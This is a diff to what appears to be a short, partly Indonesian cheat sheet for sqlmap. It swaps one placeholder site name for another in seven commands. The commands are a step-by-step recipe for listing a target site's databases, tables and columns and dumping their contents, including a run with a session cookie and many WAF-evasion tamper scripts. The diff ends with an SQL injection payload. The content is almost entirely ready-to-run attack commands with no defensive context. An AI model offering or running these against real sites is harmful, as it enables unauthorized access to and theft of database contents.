@@ -1,12 +1,12 @@
 # SQLMAP
 
-1. situsanda.com/news.php?id=1
-2. python2 sqlmap.py "situsanda.com/news.php?id=1" --dbs
-3. python2 sqlmap.py "situsanda.com/news.php?id=1" --tables -D situsanda
-4. python2 sqlmap.py "situsanda.com/news.php?id=1" --columns -D namadatabase -T namatabel
-5. python2 sqlmap.py "situsanda.com/news.php?id=1" --dump -D namadatabase -T namatabel
-6. python2 sqlmap.py "situsanda.com/news.php?id=1" --level=5 --risk=3 --dbs
-7. python2 sqlmap.py "situsanda.com/news.php?id=1" --cookie='PHPSESSID=gsi3k0dblqj5tj8arcptqs73bi' --dbs --batch --dump --tables --columns --tamper=between,bluecoat,equaltolike,greatest,ifnull2ifisnull,modsecurityzeroversioned,multiplespaces,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --level 5 --dbms=mysql
+1. yoursite.com/news.php?id=1
+2. python2 sqlmap.py "yoursite.com/news.php?id=1" --dbs
+3. python2 sqlmap.py "yoursite.com/news.php?id=1" --tables -D yoursite
+4. python2 sqlmap.py "yoursite.com/news.php?id=1" --columns -D namadatabase -T namatabel
+5. python2 sqlmap.py "yoursite.com/news.php?id=1" --dump -D namadatabase -T namatabel
+6. python2 sqlmap.py "yoursite.com/news.php?id=1" --level=5 --risk=3 --dbs
+7. python2 sqlmap.py "yoursite.com/news.php?id=1" --cookie='PHPSESSID=gsi3k0dblqj5tj8arcptqs73bi' --dbs --batch --dump --tables --columns --tamper=between,bluecoat,equaltolike,greatest,ifnull2ifisnull,modsecurityzeroversioned,multiplespaces,randomcase,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor --level 5 --dbms=mysql
 
 # SQL Injection basics
 1. '+OR+1=1-- (microsoft)
